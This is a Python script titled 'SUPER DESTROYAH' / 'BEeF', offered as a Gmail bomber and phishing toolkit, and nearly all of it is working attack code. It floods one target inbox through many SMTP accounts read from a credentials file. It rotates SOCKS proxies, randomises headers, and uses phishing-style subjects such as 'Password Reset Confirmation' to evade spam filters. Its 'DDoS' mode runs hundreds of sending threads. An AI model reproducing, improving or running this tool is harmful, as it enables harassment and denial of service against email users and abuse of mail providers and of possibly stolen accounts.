#!/usr/bin/env python3
"""
SUPER DESTROYAH v3.0 - Mass Gmail Flood Attack System
Advanced evasion techniques and multi-email distributed bombing
"""

import smtplib
import threading
import time
import random
import string
import socket
import ssl
import json
import os
import sys
import argparse
from datetime import datetime
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import dns.resolver
import socks
import requests
from fake_useragent import UserAgent
import base64

class SuperDestroyah:
    def __init__(self):
        self.attack_running = False
        self.sent_count = 0
        self.failed_count = 0
        self.attack_start_time = None
        self.email_pool = []
        self.proxy_pool = []
        self.ua = UserAgent()
        
    def load_config(self):
        """Load configuration from file"""
        config = {
            'smtp_servers': [
                {'host': 'smtp.gmail.com', 'port': 587, 'tls': True},
                {'host': 'smtp.gmail.com', 'port': 465, 'ssl': True},
                {'host': 'smtp-mail.outlook.com', 'port': 587, 'tls': True},
                {'host': 'smtp.office365.com', 'port': 587, 'tls': True},
                {'host': 'smtp.mail.yahoo.com', 'port': 587, 'tls': True},
            ],
            'threads': 50,
            'delay_range': (0.1, 0.5),
            'retry_attempts': 3,
            'max_emails_per_account': 50,
            'rotate_accounts_after': 100
        }
        return config
    
    def generate_random_email(self):
        """Generate random sender email addresses"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
        domain = random.choice(domains)
        return f"{username}@{domain}"
    
    def generate_subject(self):
        """Generate realistic email subjects to evade spam filters"""
        subjects = [
            "Urgent: Account Verification Required",
            "Important Security Alert",
            "Your Recent Transaction",
            "Update Required for Your Account",
            "Confirmation Needed",
            "Action Required: Suspicious Activity Detected",
            "Package Delivery Notification",
            "Invoice #INV-{}-{}".format(random.randint(10000, 99999), random.randint(100, 999)),
            "Meeting Request: {}".format(datetime.now().strftime("%B %d")),
            "Password Reset Confirmation"
        ]
        return random.choice(subjects)
    
    def generate_body(self, mode="normal"):
        """Generate email bodies with varying content"""
        templates = {
            "normal": [
                """Hello,

This is an important notification regarding your account. Please review the attached information.

Best regards,
Support Team""",
                """Dear User,

We have detected unusual activity on your account. Please verify your information.

Sincerely,
Security Department""",
            ],
            "html": [
                """<html><body>
<div style="font-family: Arial, sans-serif; padding: 20px;">
<h3>Important Notification</h3>
<p>Your attention is required for account verification.</p>
<p>Click <a href="https://example.com/verify">here</a> to proceed.</p>
</div></body></html>""",
                """<html><body>
<div style="background: #f5f5f5; padding: 20px; border-radius: 5px;">
<h4>Security Alert</h4>
<p>We detected a login attempt from a new device.</p>
<p>Location: {}°N, {}°W</p>
</div></body></html>""".format(random.randint(0, 90), random.randint(0, 180))
            ],
            "encoded": [
                base64.b64encode(b"Urgent account update required. Please respond immediately.").decode(),
                base64.b64encode(b"Security verification needed. Your account may be suspended.").decode()
            ]
        }
        
        if mode == "html":
            return random.choice(templates["html"]), "html"
        elif mode == "encoded":
            return random.choice(templates["encoded"]), "plain"
        else:
            return random.choice(templates["normal"]), "plain"
    
    def get_random_headers(self):
        """Generate random email headers to avoid pattern detection"""
        headers = {
            'Message-ID': f"<{''.join(random.choices(string.ascii_letters + string.digits, k=32))}@example.com>",
            'Date': datetime.now().strftime('%a, %d %b %Y %H:%M:%S %z'),
            'MIME-Version': '1.0',
            'User-Agent': self.ua.random,
            'X-Mailer': random.choice(['Microsoft Outlook 16.0', 'Apple Mail', 'Mozilla Thunderbird', 'Postbox']),
            'X-Priority': str(random.randint(1, 3)),
            'X-MSMail-Priority': random.choice(['Normal', 'High', 'Low']),
            'Importance': random.choice(['Normal', 'High', 'Low'])
        }
        return headers
    
    def setup_smtp_connection(self, email, password, proxy=None):
        """Setup SMTP connection with optional proxy"""
        try:
            # Randomly select SMTP server
            config = self.load_config()
            server_config = random.choice(config['smtp_servers'])
            
            if proxy:
                # Use SOCKS proxy if provided
                proxy_host, proxy_port = proxy.split(':')
                socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
                socket.socket = socks.socksocket
            
            if server_config.get('ssl'):
                smtp = smtplib.SMTP_SSL(server_config['host'], server_config['port'], 
                                       timeout=30)
            else:
                smtp = smtplib.SMTP(server_config['host'], server_config['port'], 
                                   timeout=30)
                if server_config.get('tls'):
                    smtp.starttls()
            
            smtp.login(email, password)
            return smtp
            
        except Exception as e:
            print(f"[!] Connection failed: {str(e)}")
            return None
    
    def send_email_advanced(self, sender_email, sender_pass, target_email, email_id, proxy=None):
        """Send email with advanced evasion techniques"""
        try:
            # Random delay to avoid rate limiting
            time.sleep(random.uniform(*self.load_config()['delay_range']))
            
            # Setup connection
            smtp = self.setup_smtp_connection(sender_email, sender_pass, proxy)
            if not smtp:
                return False
            
            # Create message with random variations
            msg = MIMEMultipart('alternative')
            
            # Add random headers
            for key, value in self.get_random_headers().items():
                msg[key] = value
            
            # Random sender name
            sender_name = random.choice(['Support Team', 'Security Department', 'Account Services', 
                                        'Notification System', 'Administrator'])
            msg['From'] = f"{sender_name} <{sender_email}>"
            msg['To'] = target_email
            msg['Subject'] = self.generate_subject()
            
            # Generate content with random encoding
            content_types = ['plain', 'html', 'encoded']
            content_type = random.choice(content_types)
            body, body_type = self.generate_body(content_type)
            
            if content_type == 'encoded':
                # Add encoded part
                part1 = MIMEText("This message requires decoding.", 'plain')
                part2 = MIMEText(body, 'plain')
                part2.add_header('Content-Transfer-Encoding', 'base64')
                msg.attach(part1)
                msg.attach(part2)
            else:
                msg.attach(MIMEText(body, body_type))
            
            # Add random attachment-like headers
            if random.random() > 0.7:
                msg.add_header('Content-Disposition', 'attachment; filename="document_{}.pdf"'.format(
                    random.randint(1000, 9999)))
            
            # Send email
            smtp.sendmail(sender_email, target_email, msg.as_string())
            smtp.quit()
            
            self.sent_count += 1
            print(f"[+] Email #{email_id} sent from {sender_email} to {target_email}")
            return True
            
        except Exception as e:
            self.failed_count += 1
            print(f"[-] Failed email #{email_id}: {str(e)}")
            return False
    
    def load_email_accounts(self, accounts_file):
        """Load multiple email accounts for distributed attack"""
        try:
            with open(accounts_file, 'r') as f:
                for line in f:
                    if ':' in line:
                        email, password = line.strip().split(':', 1)
                        self.email_pool.append({'email': email, 'password': password})
            print(f"[+] Loaded {len(self.email_pool)} email accounts")
        except Exception as e:
            print(f"[!] Error loading accounts: {e}")
    
    def load_proxies(self, proxy_file):
        """Load proxy list for IP rotation"""
        try:
            with open(proxy_file, 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.proxy_pool)} proxies")
        except Exception as e:
            print(f"[!] Error loading proxies: {e}")
    
    def normal_destroyer(self, sender_email, sender_pass, target_email, count=100):
        """Option 1: Normal bombing with single account"""
        print(f"[*] Starting BEeF normal attack")
        print(f"[*] Target: {target_email}")
        print(f"[*] Count: {count} emails")
        
        self.attack_start_time = time.time()
        self.attack_running = True
        
        # Create thread pool
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for i in range(1, count + 1):
                future = executor.submit(
                    self.send_email_advanced,
                    sender_email,
                    sender_pass,
                    target_email,
                    i
                )
                futures.append(future)
            
            # Wait for completion
            for future in as_completed(futures):
                future.result()
        
        self.print_stats()
    
    def super_destroyer(self, target_email, accounts_file, proxy_file=None, count=1000):
        """Option 2: Super distributed attack with multiple accounts"""
        print(f"[*] BEeF Destroyer - mass attack")
        print(f"[*] Target: {target_email}")
        print(f"[*] Total emails to send: {count}")
        
        # Load resources
        self.load_email_accounts(accounts_file)
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
        
        if not self.email_pool:
            print("[!] No email accounts loaded!")
            return
        
        self.attack_start_time = time.time()
        self.attack_running = True
        
        # Calculate distribution
        emails_per_account = min(self.load_config()['max_emails_per_account'], 
                                count // len(self.email_pool) + 1)
        
        print(f"[*] Using {len(self.email_pool)} accounts")
        print(f"[*] {emails_per_account} emails per account")
        
        # Start massive attack
        total_threads = min(self.load_config()['threads'], len(self.email_pool) * 5)
        
        print(f"[*] Launching {total_threads} concurrent threads")
        print("[*] BEeF is attacking...")
        
        email_queue = Queue()
        
        # Fill queue with email tasks
        for i in range(count):
            account = random.choice(self.email_pool)
            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            email_queue.put({
                'account': account,
                'proxy': proxy,
                'email_id': i + 1
            })
        
        # Worker function
        def worker():
            while not email_queue.empty() and self.attack_running:
                try:
                    task = email_queue.get_nowait()
                    self.send_email_advanced(
                        task['account']['email'],
                        task['account']['password'],
                        target_email,
                        task['email_id'],
                        task['proxy']
                    )
                    email_queue.task_done()
                except:
                    break
        
        # Start worker threads
        threads = []
        for _ in range(total_threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor progress
        while any(t.is_alive() for t in threads) and self.attack_running:
            time.sleep(1)
            self.print_stats()
            
            # Check if we should rotate accounts
            if self.sent_count % self.load_config()['rotate_accounts_after'] == 0:
                print("[*] Rotating email accounts...")
                random.shuffle(self.email_pool)
        
        self.attack_running = False
        self.print_stats(final=True)
    
    def print_stats(self, final=False):
        """Print attack statistics"""
        if self.attack_start_time:
            elapsed = time.time() - self.attack_start_time
            rate = self.sent_count / elapsed if elapsed > 0 else 0
            
            print(f"\n{'='*50}")
            print(f"BEeF summary")
            print(f"{'='*50}")
            print(f"Emails Sent: {self.sent_count}")
            print(f"Emails Failed: {self.failed_count}")
            print(f"Success Rate: {(self.sent_count/(self.sent_count+self.failed_count)*100):.1f}%")
            print(f"Elapsed Time: {elapsed:.1f} seconds")
            print(f"Send Rate: {rate:.1f} emails/second")
            print(f"{'='*50}")
            
            if rate > 10:
                print("[!] BEeF intensity - Gmail saturation")
            if self.sent_count > 500:
                print("[!] Massive BEeF - Target inbox saturation")
            
            if final:
                print("\n[+] BEeF attacked sucessfully!")
    
    def ddos_flood_mode(self, target_email, email_list, proxy_list, duration=300):
        """Extreme DDoS flood mode - Maximum intensity"""
        print(f"[!] BEeF DoS")
        print(f"[!] WARNING: This shit will send maximum possible emails per second")
        print(f"[!] Duration: {duration} seconds")
        
        self.load_email_accounts(email_list)
        self.load_proxies(proxy_list)
        
        if len(self.email_pool) < 10:
            print("[!] Need at least 10 email accounts for DoS BEeF")
            return
        
        self.attack_start_time = time.time()
        self.attack_running = True
        
        # Extreme threading for maximum throughput
        max_threads = 200  # Maximum concurrent connections
        
        def ddos_worker(worker_id):
            emails_sent = 0
            while self.attack_running and time.time() - self.attack_start_time < duration:
                try:
                    account = random.choice(self.email_pool)
                    proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
                    
                    # Ultra-fast sending with minimal delay
                    if self.send_email_advanced(
                        account['email'],
                        account['password'],
                        target_email,
                        f"DDOS-{worker_id}-{emails_sent}",
                        proxy
                    ):
                        emails_sent += 1
                    
                    # Micro-delay to avoid overwhelming local resources
                    time.sleep(0.01)
                    
                except:
                    pass
        
        # Launch DDoS threads
        print(f"[*] Launching {max_threads} DDoS threads...")
        threads = []
        for i in range(max_threads):
            thread = threading.Thread(target=ddos_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Run for specified duration
        start_time = time.time()
        while time.time() - start_time < duration and self.attack_running:
            time.sleep(1)
            elapsed = time.time() - self.attack_start_time
            rate = self.sent_count / elapsed if elapsed > 0 else 0
            print(f"[DDOS] Rate: {rate:.0f} emails/sec | Total: {self.sent_count} | Threads: {max_threads}")
            
            # Adaptive threading - increase if rate drops
            if rate < 50 and max_threads < 500:
                max_threads += 10
                for _ in range(10):
                    thread = threading.Thread(target=ddos_worker, args=(max_threads,))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
        
        self.attack_running = False
        time.sleep(2)  # Let threads finish
        self.print_stats(final=True)

def main():
    parser = argparse.ArgumentParser(description="BEeF - gmail bomber + phishtoolkit")
    parser.add_argument("-m", "--mode", choices=["normal", "super", "BEeF DoS"], required=True,
                       help="Attack mode: normal, super, or ddos")
    parser.add_argument("-t", "--target", required=True, help="Target email address")
    parser.add_argument("-s", "--sender", help="Sender email (for normal mode)")
    parser.add_argument("-p", "--password", help="Sender password (for normal mode)")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of emails to send")
    parser.add_argument("-a", "--accounts", help="File with email:password accounts (for super/ddos)")
    parser.add_argument("-x", "--proxies", help="File with proxy list (ip:port)")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Duration in seconds (ddos mode)")
    
    args = parser.parse_args()
    
    bomber = SuperDestroyah()
    
    print("\033[38;5;45m")  # azul turquesa brillante

    print("\033[38;5;45m" + r"""
 ____  _____     _____
| __ )| ____|___|  ___|
|  _ \|  _| / _ \ |_   
| |_) | |__|  __/  _|  
|____/|_____\___|_|    
""" + "\033[0m")
    
    if args.mode == "normal":
        if not args.sender or not args.password:
            print("[!] Normal mode requires --sender and --password")
            return
        bomber.normal_destroyer(args.sender, args.password, args.target, args.count)
    
    elif args.mode == "super":
        if not args.accounts:
            print("[!] Super mode requires --accounts file")
            return
        bomber.super_destroyer(args.target, args.accounts, args.proxies, args.count)
    
    elif args.mode == "ddos":
        if not args.accounts:
            print("[!] DDoS mode requires --accounts file")
            return
        bomber.ddos_flood_mode(args.target, args.accounts, args.proxies, args.duration)

if __name__ == "__main__":
    # Install required packages if missing
    required_packages = ['fake-useragent', 'pysocks', 'dnspython']
    
    try:
        from fake_useragent import UserAgent
        import socks
        import dns.resolver
    except ImportError:
        print("[!] Installing required packages...")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + required_packages)
    
    main()
